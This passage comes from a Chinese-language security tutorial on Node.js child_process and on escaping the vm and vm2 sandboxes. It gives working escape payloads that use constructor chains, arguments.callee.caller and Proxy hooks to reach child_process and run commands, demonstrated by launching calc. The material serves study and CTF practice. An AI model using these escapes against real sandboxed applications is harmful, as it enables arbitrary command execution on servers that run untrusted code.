spawn=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">spawn</span>;<br><span class="hljs-keyword">var</span> who=<span class="hljs-title function_">spawn</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>who.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;stdout: &#x27;</span>+data);<br>&#125;);<br>who.<span class="hljs-property">stderr</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;stderr: &#x27;</span>+data)<br>&#125;);<br>who.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;close&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">code</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;closing code: &#x27;</span>+code);<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309145912479.png" alt="image-20240309145912479"></p><p>spawn方法接受两个参数，第一个是可执行文件，第二个是参数数组。</p><p>spawn对象返回一个对象，代表子进程。该对象部署了EventEmitter接口，它的data事件可以监听，从而得到子进程的输出结果。</p><p>spawn方法与exec方法非常类似，只是使用格式略有区别。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">child_process.<span class="hljs-title function_">exec</span>(command, [options], callback)<br>child_process.<span class="hljs-title function_">spawn</span>(command, [args], [options])<br></code></pre></td></tr></table></figure></li><li><p>fork()：fork方法直接创建一个子进程，执行Node脚本，<code>fork(&#39;./child.js&#39;)</code> 相当于 <code>spawn(&#39;node&#39;, [&#39;./child.js&#39;])</code> 。与spawn方法不同的是，fork会在父进程与子进程之间，建立一个通信管道，用于进程之间的通信。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> n = child_process.<span class="hljs-title function_">fork</span>(<span class="hljs-string">&#x27;./child.js&#x27;</span>);<br>n.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">m</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;PARENT got message:&#x27;</span>, m);<br>&#125;);<br>n.<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">hello</span>: <span class="hljs-string">&#x27;world&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><p>上面代码中，fork方法返回一个代表进程间通信管道的对象，对该对象可以监听message事件，用来获取子进程返回的信息，也可以向子进程发送信息。</p><p>child.js脚本的内容如下。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">process.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">m</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;CHILD got message:&#x27;</span>, m);<br>&#125;);<br>process.<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">foo</span>: <span class="hljs-string">&#x27;bar&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><p>上面代码中，子进程监听message事件，并向父进程发送信息。</p></li><li><p>send()：使用 child_process.fork() 生成新进程之后，就可以用 child.send(message, [sendHandle]) 向新进程发送消息。新进程中通过监听message事件，来获取消息。也就是上面fork示例的代码。</p></li></ul></li></ul><h1 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h1><p>参考文章：<a href="https://xz.aliyun.com/t/13427?time__1311=mqmxnDBQqeu4lxGg2DyeHDkQdexWwhD&alichlgref=https://www.google.com/">NodeJs vm沙箱逃逸 - 先知社区 (aliyun.com)</a></p><h2 id="vm模块的使用"><a href="#vm模块的使用" class="headerlink" title="vm模块的使用"></a>vm模块的使用</h2><ul><li><strong>vm.createContext([contextObject[, options]])</strong></li></ul><p>该模块在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8引擎为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309153446420.png" alt="image-20240309153446420"></p><ul><li><p>**vm.runInContext(code, contextifiedSandbox[, options])**：该函数参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</p><p>runInContext需要配合createContext创建的沙箱来进行运行</p></li><li><p>所以这两个模块方法配合起来使用如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span>=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">const</span> sandbox=&#123;<span class="hljs-attr">globalVar</span>:<span class="hljs-number">10</span>&#125;;<br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">&#x27;globalVar*=2;console.log(globalVar);&#x27;</span>,sandbox);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309154253819.png" alt="image-20240309154253819"></p></li><li><p><strong>vm.runInThisContext(code[, options])</strong></p></li></ul><p>在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。</p><p>这里需要注意的就是runInThisContext虽然是会创建相关的沙箱环境，可以访问到global上的全局变量，但是访问不到自定义的变量。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309154545749.png" alt="image-20240309154545749"></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span>=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Var</span>=<span class="hljs-number">123</span>;<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;console.log(globalVar);&#x27;</span>);<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;console.log(Var);&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309154838701.png" alt="image-20240309154838701"></p><blockquote><p>可知可以访问全局变量，但自定义的不能访问，会报错。</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">let</span> localVar = <span class="hljs-string">&#x27;initial value&#x27;</span>;<br><span class="hljs-keyword">const</span> vmResult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;vmResult:&#x27;</span>, vmResult);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;localVar:&#x27;</span>, localVar);<br><span class="hljs-comment">// vmResult: &#x27;vm&#x27;, localVar: &#x27;initial value&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><strong>vm.runInNewContext(code[, contextObject[, options]])</strong></li></ul><p>creatContext和runInContext的结合版，传入要执行的代码和沙箱对象，不提供的话默认生成一个沙箱来进行使用。</p><blockquote><p>提一嘴Nodejs中数据类型可以分为两大类：基本类型和对象类型</p><p>基本类型包括以下六种：</p><ul><li>string：表示文本数据，用单引号或双引号包裹，如 ‘hello’ 或 “world”。</li><li>number：表示数值数据，可以是整数或小数，如 42 或 3.14。</li><li>boolean：表示逻辑数据，只有两个值，true 或 false。</li><li>null：表示空值，表示一个对象没有引用任何值。</li><li>undefined：表示未定义值，表示一个变量没有被赋值。</li><li>symbol：表示唯一的标识符，用 Symbol() 函数创建，如 Symbol(‘foo’)。</li></ul><p>那么除了这些基本类型的就是对象类型了。</p></blockquote><ul><li><p><strong>new vm.Script(code, options)：</strong>创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，指的是 code 中的变量、函数、对象等，不会自动成为全局作用域中的属性或成员。相反，它仅仅绑定于每次执行它的对象。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-comment">//script=new vm.Script(&#x27;this.toString.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;calc&quot;);&#x27;)</span><br>script=<span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;name=&quot;clown&quot;&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox = &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;;<br><span class="hljs-keyword">const</span> context=vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>script.<span class="hljs-title function_">runInContext</span>(context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sandbox);<span class="hljs-comment">//&#123; name: &#x27;clown&#x27; &#125;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="利用沙箱来执行命令"><a href="#利用沙箱来执行命令" class="headerlink" title="利用沙箱来执行命令"></a>利用沙箱来执行命令</h2><p>这里写一下不同沙箱执行命令的写法</p><ul><li><p><strong>runInThisContext</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">`process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)`</span>);<br></code></pre></td></tr></table></figure><p>然后就能弹计算器了</p><blockquote><p>这里了解一下为什么要这么写</p><ul><li><p>process：</p><p>process 对象是 Node.js 提供的一个全局变量，它包含了有关当前 Node.js 进程的信息和控制方法。</p><p>process 对象可以直接使用，而不需要通过 require() 引入，是因为它是一个预定义的全局对象，类似于 console、global、Buffer 等。</p><p>process 对象有很多有用的属性和方法，例如：</p><ul><li><p>process.env：可以获取或设置环境变量，如 process.env.NODE_ENV。</p></li><li><p>process.argv：可以获取命令行参数，如 process.argv[0]。</p></li><li><p>process.cwd()：可以获取当前工作目录，如 process.cwd()。</p></li><li><p>process.exit()：可以退出当前进程，如 process.exit(0)。</p></li><li><p>process.mainModule： 是 Node.js 提供的一个全局变量，它是一个对象，表示当前主模块的 Module 实例，主模块就是node执行的js。</p><p>它可以让你获取当前主模块的一些信息，例如它的文件名、路径、子模块等，比如process.mainModule.require。</p></li></ul></li><li><p>因为沙箱中没有 require() 函数，这是 Node.js 的一个全局函数，用于加载模块，但它不是 global 对象上的一个属性，而是在每个模块的本地作用域中定义的。从上面的作用域可以知道，require就是在node执行的js内定义的函数，而沙箱内部就是另一个独立的模块，所以是没有require函数的，需要从process.mainModule中获取。</p></li></ul></blockquote></li><li><p><strong>vm.runInContext(code, contextifiedSandbox[, options])</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox=&#123;<span class="hljs-attr">x</span>:<span class="hljs-number">2</span>&#125;;<br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> code=<span class="hljs-string">&#x27;this.toString.constructor(&quot;return process&quot;)();&#x27;</span>;<br><span class="hljs-comment">//vm.runInNewContext(`this.constructor.constructor(&#x27;return process&#x27;)()`);这样获取process对象也是可以的</span><br><span class="hljs-keyword">const</span> res=vm.<span class="hljs-title function_">runInContext</span>(code,sandbox);<br>res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>);<br></code></pre></td></tr></table></figure><p>因为该方法的作用域是独立于global的，所以我们需要先获取global的process对象，然后就可以执行命令了。</p><blockquote><p>解释一下是怎么获取process对象的：</p><p>在沙箱中this指向全局环境中的{x:2}对象，这里通过调试可以看到</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310094536377.png" alt="image-20240310094536377"></p><p>这个对象是不属于沙箱环境的，它属于全局环境，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用Function的constructor生成的函数，最终返回了一个process对象。</p><p>这是一个构造器链的图例：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309170145802.png" alt="image-20240309170145802"></p><p>所以上面的toString和constructor都是Object.prototype上的属性，所以这两种写法都可以。</p><p>构造器链的尽头是<code>Function</code>，Function的构造器是Function本身，所以利用原型链调用Function的构造函数之后就能获得process对象。</p></blockquote><p>所以只要是this是外部的引用都是可以来进行逃逸的，所以下面这样写也是可以的</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> sandbox = &#123;<br>    <span class="hljs-attr">x</span>: []<br>&#125;;<br><br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">&#x27;x.constructor.constructor(&quot;return process&quot;)()&#x27;</span>,sandbox);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>));<br></code></pre></td></tr></table></figure><blockquote><p>但是如果x是是数字、字符串等primitive类型就无法逃逸出来，因为他们在传参的时候将数值传递过去，而不是引用属性，无法进一步调用<code>constructor</code></p></blockquote></li><li><p><strong>runInNewContext</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> code = <span class="hljs-string">&#x27;this.constructor.constructor(&quot;return process&quot;)();&#x27;</span>;<br><br><span class="hljs-keyword">const</span> res=vm.<span class="hljs-title function_">runInNewContext</span>(code);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>));<br></code></pre></td></tr></table></figure><p>原理和上面的runInContext一样。</p></li><li><p><strong>new vm.Script(code, options)</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br>script=<span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;this.toString.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;calc&quot;);&#x27;</span>)<br><span class="hljs-keyword">const</span> sandbox = &#123;<span class="hljs-attr">x</span>:[]&#125;;<br><span class="hljs-keyword">const</span> context=vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>script.<span class="hljs-title function_">runInContext</span>(context);<br></code></pre></td></tr></table></figure><p>这里同理。</p></li></ul><h2 id="vm绕过Object-create-null"><a href="#vm绕过Object-create-null" class="headerlink" title="vm绕过Object.create(null)"></a>vm绕过Object.create(null)</h2><p>当我们的sandbox沙箱对象设置为null时，就无法通过this.construtor来获取Function的构造函数</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><br><span class="hljs-keyword">const</span> code = <span class="hljs-string">&quot;this.constructor.constructor(&#x27;return process&#x27;)().env&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(vm.<span class="hljs-title function_">runInContext</span>(code,sandbox));<br></code></pre></td></tr></table></figure><p>上面的函数就会报如下错误</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309183122332.png" alt="image-20240309183122332"></p><p>绕过一种方法就是利用<strong>arguments.callee.caller</strong></p><p>这里了解一下arguments是什么</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">arguments 是一个类数组对象，它包含了传递给当前函数的所有参数。<br><br>arguments.callee 是 arguments 对象的一个属性，它表示当前正在执行的函数本身。<br><br>arguments.callee.caller 是 arguments.callee 对象的一个属性，它表示调用当前正在执行的函数的那个函数，也就是调用当前函数的外部函数。<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">foo</span>();<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">baz</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">bar</span>();<br>&#125;<br><span class="hljs-title function_">foo</span>();<br><span class="hljs-title function_">bar</span>();<br><span class="hljs-title function_">baz</span>();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309183741062.png" alt="image-20240309183741062"></p><p>那思路就是在沙箱内定义一个函数，在沙箱外调用这个函数，那么这个函数的arguments.callee.caller则会返回沙箱外的一个对象，那么我们我们就可以在沙箱内进行逃逸了</p><p>那么下面的写法就可以进行绕过：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> func =<br>    <span class="hljs-string">`(() =&gt; &#123;</span><br><span class="hljs-string">    const a = &#123;&#125;</span><br><span class="hljs-string">    a.toString = function () &#123;</span><br><span class="hljs-string">      const cc = arguments.callee.caller;</span><br><span class="hljs-string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">      return p.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;).toString()</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">  &#125;)()`</span>;<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(func, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span> + res);<br></code></pre></td></tr></table></figure><blockquote><p>说一下大概流程：</p><p>这里在沙箱内定义了一个函数将toString()进行了重写，我们在vm.runInContext(func, context)这里执行了该函数重写toString后返回了沙箱内的a对象，然后console.log的时候默认执行了toString()方法，这个时候cc获得的就是外部执行对象，然后我们就成功进行了逃逸。</p><p>这里也可以自己去调试一下会更加清晰。</p></blockquote><p>如果无法重写或触发toString()方法，还可以利用<strong>Proxy</strong>来劫持属性</p><p><strong>这里了解一下Proxy：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Proxy 对象是 JavaScript 提供的一个内置对象，它可以用来创建一个代理，用于拦截和修改目标对象的一些基本操作，例如属性的读取、赋值、删除、枚举、函数的调用等<br><br>Proxy 对象的用法是：<br><br>创建一个 Proxy 对象，需要使用 new Proxy(target, handler) 构造函数，传入两个参数，分别是目标对象和处理器对象。<br>目标对象是要被代理的对象，可以是任何类型的对象，例如数组、函数、另一个代理等。<br>处理器对象是一个普通的对象，它定义了一些拦截函数（也称为陷阱），用于拦截和修改目标对象的基本操作。<br></code></pre></td></tr></table></figure><p>这是一个例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//get</span><br><span class="hljs-keyword">let</span> numbers=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]<br>numbers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(numbers,&#123;<br>    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>        <span class="hljs-keyword">if</span> (prop <span class="hljs-keyword">in</span> target) &#123;<br>          <span class="hljs-keyword">return</span> target[prop];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 默认值</span><br>        &#125;<br>      &#125;<br>&#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numbers[<span class="hljs-number">1</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numbers[<span class="hljs-number">123</span>]);<br><br><span class="hljs-comment">//set</span><br><span class="hljs-keyword">let</span> numbers1 = [];<br><br>numbers1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(numbers1, &#123; <span class="hljs-comment">// (*)</span><br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, prop, val</span>) &#123; <span class="hljs-comment">// 拦截写入操作</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(val) == <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>      target[prop] = val;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>  &#125;<br>&#125;);<br><br>tmp=numbers1.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;ceshi&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">typeof</span>(tmp));<br>tmp1=numbers1.<span class="hljs-title function_">push</span>(<span class="hljs-number">2</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">typeof</span>(tmp1));<br></code></pre></td></tr></table></figure><p>下面是利用get钩子和set钩子来进行逃逸的例子</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//利用get钩子逃逸</span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> script =<br>    <span class="hljs-string">`new Proxy(&#123;&#125;, &#123;</span><br><span class="hljs-string">        get: function()&#123;</span><br><span class="hljs-string">            const cc = arguments.callee.caller;</span><br><span class="hljs-string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">            return p.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">abc</span>)<br></code></pre></td></tr></table></figure><blockquote><p>这里的原理就是在沙箱外部访问了代理对象的任意属性，即使属性不存在也会自动调用钩子函数，这样就和上面一样得到了外部对象然后进行命令执行</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//利用set钩子</span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> func =<br>    <span class="hljs-string">`new Proxy(&#123;&#125;, &#123;</span><br><span class="hljs-string">        set: function(my,key, value) &#123;</span><br><span class="hljs-string">        (value.constructor.constructor(&#x27;return process&#x27;))().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;).toString()</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;)`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(func, context);<br>res[<span class="hljs-string">&#x27;&#x27;</span>]=&#123;&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>这里的原理就是为代理对象添加属性时会自动调用set钩子，那么就达到了获取外部对象的目的，然后成功命令执行</p></blockquote><p>上面的过程也可以去调试一下代码会更加清晰运行过程。</p><h1 id="vm2沙箱逃逸"><a href="#vm2沙箱逃逸" class="headerlink" title="vm2沙箱逃逸"></a>vm2沙箱逃逸</h1><p>参考文章：<a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD/QbiQQuD=CNcDID&alichlgref=https://www.google.com/#toc-3">NodeJS VM和VM2沙箱逃逸 - 先知社区 (aliyun.com)</a></p><p>vm2的具体实现原理参考这篇文章：<a href="https://www.anquanke.com/post/id/207283">vm2实现原理分析-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>vm2在vm的基础上进行了优化，比较重要的就是利用了Proxy代理，使用钩子拦截constructor和__ proto __这些属性的访问。</p><p>网上看好像vm2的代码在3.9版本之后大幅修改，结构变成下面这样</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310022305060.png" alt="image-20240310022305060"></p><p>和上面的文章文件结构都不一样，不过使用的方法没有变化。</p><p>我们用到的vm2的沙箱环境是通过main.js导出的VM和NodeVM，还有一个VMScript是封装了vm.Script</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310100756542.png" alt="image-20240310100756542"></p><p>vm2执行代码示例如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//vm2</span><br><span class="hljs-keyword">const</span>&#123;<span class="hljs-variable constant_">VM</span>,<span class="hljs-title class_">VMScript</span>&#125;=<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);<span class="hljs-comment">//解构赋值，从中提取vm2的VM和VMScript</span><br><span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VMScript</span>(<span class="hljs-string">&quot;let a = 2;a&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>((<span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>()).<span class="hljs-title function_">run</span>(script));<span class="hljs-comment">//2</span><br></code></pre></td></tr></table></figure><blockquote><p>VM 是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化之后调用 <code>run</code> 方法即可运行一段脚本。</p></blockquote><p>上述代码的具体运行原理我就贴个图，具体的要去看文章，因为代码结构变了在新的vm2中</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310101817366.png" alt="image-20240310101817366"></p><p>还有一篇文章分析了两个案例：<a href="https://www.anquanke.com/post/id/207291">vm2沙箱逃逸分析-安全客 - 安全资讯平台 (anquanke.com)</a></p><h1 id="题目分析"><a href="#题目分析" class="headerlink" 